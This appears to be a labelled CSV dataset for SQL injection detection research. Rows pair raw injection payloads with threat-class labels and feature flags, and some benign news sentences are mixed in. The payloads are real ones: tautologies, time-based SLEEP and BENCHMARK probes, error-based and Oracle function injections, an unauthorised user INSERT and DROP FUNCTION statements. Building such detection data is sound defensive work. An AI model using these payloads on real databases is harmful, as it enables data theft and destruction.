5519,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan","1' ) ) OR 9643 = ( SELECT COUNT ( * ) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ) AND ( ( 'OZAN' = 'OZAN",injection_fragment,UNKNOWN,domains,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,domains,3
1950,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln","1' ) ) ) AND 6510 = ( SELECT COUNT ( * ) FROM SYSUSERS AS SYS1,SYSUSERS AS SYS2,SYSUSERS AS SYS3,SYSUSERS AS SYS4,SYSUSERS AS SYS5,SYSUSERS AS SYS6,SYSUSERS AS SYS7 ) AND ( ( ( 'RFLN' = 'RFLN",injection_fragment,UNKNOWN,sysusers,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,sysusers,3
7423,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" where 3740  =  3740 rlike sleep  (  5  )  #","1"" WHERE 3740 = 3740 RLIKE SLEEP ( 5 ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
10991,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets","1' ) ) ) ( SELECT ( CASE WHEN ( 4587 = 4587 ) THEN REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) ELSE CHAR ( 76 ) ||CHAR ( 65 ) ||CHAR ( 102 ) ||CHAR ( 72 ) END ) FROM ( VALUES ( 0 ) ) ) AND ( ( ( 'NETS' LIKE 'NETS",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
48,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or "".@"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR "".@"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
6736,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1' ) ) ) OR 8514 = BENCHMARK ( 5000000,MD5 ( 0X544D5A4C ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
8215,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260  =  1260,1 ) ) AND 4386 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4386 = 4386 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) AND ( ( 1260 = 1260,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
1777,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1 OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
6821,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr","1"" ) ) ) OR ROW ( 1045,7562 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 1045 = 1045,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 8488 UNION SELECT 5584 UNION SELECT 3051 UNION SELECT 1210 ) A GROUP BY X ) AND ( ( ( ""HBGR"" LIKE ""HBGR",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
831,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or "",?"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR "",?"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
2928,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )","1' OR 7552 = ( SELECT COUNT ( * ) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4 )",injection_fragment,UNKNOWN,rdb,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,rdb,3
8856,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' where 2202  =  2202 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1' WHERE 2202 = 2202 AND 2716 = ( SELECT COUNT ( * ) FROM SYSUSERS AS SYS1,SYSUSERS AS SYS2,SYSUSERS AS SYS3,SYSUSERS AS SYS4,SYSUSERS AS SYS5,SYSUSERS AS SYS6,SYSUSERS AS SYS7 ) --",injection_fragment,UNKNOWN,sysusers,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,sysusers,3
6930,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,-6792 ) ) AS ZLHO WHERE 4758 = 4758 OR 2724 IN ( ( CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 112 ) +CHAR ( 106 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 2724 = 2724 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 122 ) +CHAR ( 118 ) +CHAR ( 122 ) +CHAR ( 113 ) ) ) --,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
8943,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'||  (  select 'rdqv' from dual where 1894  =  1894,1'|| ( SELECT 'RDQV' FROM DUAL WHERE 1894 = 1894,injection_fragment,UNKNOWN,dual,'rdqv',T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
5112,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'+  (  select 'mgrj' where 8514  =  8514 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'","1'+ ( SELECT 'MGRJ' WHERE 8514 = 8514 OR ROW ( 1045,7562 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 1045 = 1045,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 8488 UNION SELECT 5584 UNION SELECT 3051 UNION SELECT 1210 ) A GROUP BY X ) ) +'",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
5730,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh","1' ) OR 8315 = ( SELECT COUNT ( * ) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 ) AND ( 'LMOH' LIKE 'LMOH",injection_fragment,UNKNOWN,systables,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,systables,3
7507,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""  )   as sraw where 1997  =  1997 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","1"" ) AS SRAW WHERE 1997 = 1997 AND ( SELECT 2* ( IF ( ( SELECT * FROM ( SELECT CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 3484 = 3484,1 ) ) ) ,0X717A767A71,0X78 ) ) S ) , 8446744073709551610, 8446744073709551610 ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
10553,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'ccsb'  =  'ccsb","1' AND 5556 = ( SELECT COUNT ( * ) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5 ) AND 'CCSB' = 'CCSB",injection_fragment,UNKNOWN,all_users,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,all_users,3
6911,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  ""","1%"" ) AND 6055 = CTXSYS.DRITHSX.SN ( 6055, ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 6055 = 6055 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) AND ( ""%"" = """,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
523,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR ""@%"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
1237,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  ""","1%"" OR 9643 = ( SELECT COUNT ( * ) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ) AND ""%"" = """,injection_fragment,UNKNOWN,domains,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,domains,3
9609,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )","1 AND 5556 = ( SELECT COUNT ( * ) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5 )",injection_fragment,UNKNOWN,all_users,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,all_users,3
4556,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'jvll' like 'jvll","1' ) AND ROW ( 6237,7469 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 6237 = 6237,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 5192 UNION SELECT 3785 UNION SELECT 3931 UNION SELECT 7158 ) A GROUP BY X ) AND ( 'JVLL' LIKE 'JVLL",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
922,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1%' AND 4386 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4386 = 4386 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) AND '%' = ',injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
125,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1","SELECT * FROM USERS WHERE ID = 1 <@$$ UNION SELECT 1,VERSION ( ) -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from users,union_based,confidentiality,True,True,False,True,False,False,False,False,False,False,users,3
662,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR ""@ ( "" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
3817,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1"" ) OR 8514 = BENCHMARK ( 5000000,MD5 ( 0X544D5A4C ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
5175,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1' where 1017  =  1017 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1' WHERE 1017 = 1017 AND 7756 = DBMS_UTILITY.SQLID_TO_SQLHASH ( ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 7756 = 7756 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) --,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,dual,3
19338,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,"0"" encoding  =  ""utf-8"" ?>   <_filter>  <![CDATA[insert]]>  </_filter>   <_filter>  <![CDATA[signup]]>  </_filter>   <_filter>  <![CDATA[widget_login]]>  </_filter>   <a href  =  ""http://caritaskinshasa","0"" ENCODING = ""UTF-8"" ?> <_FILTER> <![CDATA[INSERT]]> </_FILTER> <_FILTER> <![CDATA[SIGNUP]]> </_FILTER> <_FILTER> <![CDATA[WIDGET_LOGIN]]> </_FILTER> <A HREF = ""HTTP://CARITASKINSHASA",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,True,True,False,,3
33441,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,Montreal-based Bombardier also release flight test data brand-new CSeries aircraft offer update whether plane meet ambitious schedule going commercial service next September,MONTREAL-BASED BOMBARDIER ALSO RELEASE FLIGHT TEST DATA BRAND-NEW CSERIES AIRCRAFT OFFER UPDATE WHETHER PLANE MEET AMBITIOUS SCHEDULE GOING COMMERCIAL SERVICE NEXT SEPTEMBER,injection_fragment,UPDATE,whether,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,False,False,whether,3
598,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )","INSERT INTO USERS ( LOGIN, PASSWORD, LEVEL ) VALUES ( CHAR ( 0X70 ) + CHAR ( 0X65 ) + CHAR ( 0X74 ) + CHAR ( 0X65 ) + CHAR ( 0X72 ) + CHAR ( 0X70 ) + CHAR ( 0X65 ) + CHAR ( 0X74 ) + CHAR ( 0X65 ) + CHAR ( 0X72 ) ,CHAR ( 0X64 )",full_query,INSERT,"users, users ( login, password, level )",,T2,integrity,insert unauthorized records,insert unauthorized records into users,T2,,False,False,False,False,,,,,,,,,,,,T2,integrity,insert unauthorized records,insert unauthorized records into users,write_query,integrity,False,False,False,False,False,False,False,False,False,False,users,3
34720,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"gov accessible several hours tonight internal error occurred scheduled update , &quot; spy agency said emailed statement","GOV ACCESSIBLE SEVERAL HOURS TONIGHT INTERNAL ERROR OCCURRED SCHEDULED UPDATE , &QUOT; SPY AGENCY SAID EMAILED STATEMENT",injection_fragment,UPDATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,stacked_write_or_ddl_fragment,integrity,False,False,True,False,False,False,False,False,True,False,,3
32081,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,We decided first flight update period &apos;s done,WE DECIDED FIRST FLIGHT UPDATE PERIOD &APOS;S DONE,injection_fragment,UPDATE,"period, period &apos",,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,stacked_write_or_ddl_fragment,integrity,False,False,True,False,False,False,False,False,False,False,period,3
33277,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"As result , stock exchange operators required almost entire day look delete orders","AS RESULT , STOCK EXCHANGE OPERATORS REQUIRED ALMOST ENTIRE DAY LOOK DELETE ORDERS",injection_fragment,DELETE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,True,False,,3
32609,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,Bombardier said evaluating entry-into-service (EIS) schedule provide update next months,BOMBARDIER SAID EVALUATING ENTRY-INTO-SERVICE (EIS) SCHEDULE PROVIDE UPDATE NEXT MONTHS,injection_fragment,UPDATE,"next, -",,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,False,False,next,3
34214,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,cgi yes sub0202 photo 2 1 yetglezip 71 75 e_qna view eng 25 47817 e_qna eng delete 41 24242 bbs314 129-945,CGI YES SUB0202 PHOTO 2 1 YETGLEZIP 71 75 E_QNA VIEW ENG 25 47817 E_QNA ENG DELETE 41 24242 BBS314 129-945,injection_fragment,DELETE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,True,False,,3
8542,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2643  =  1393  )   select 2643 else drop function nqss--,IF ( 2643 = 1393 ) SELECT 2643 ELSE DROP FUNCTION NQSS--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
1681,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,IF ( 5896 = 4251 ) SELECT 5896 ELSE DROP FUNCTION XMYK--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
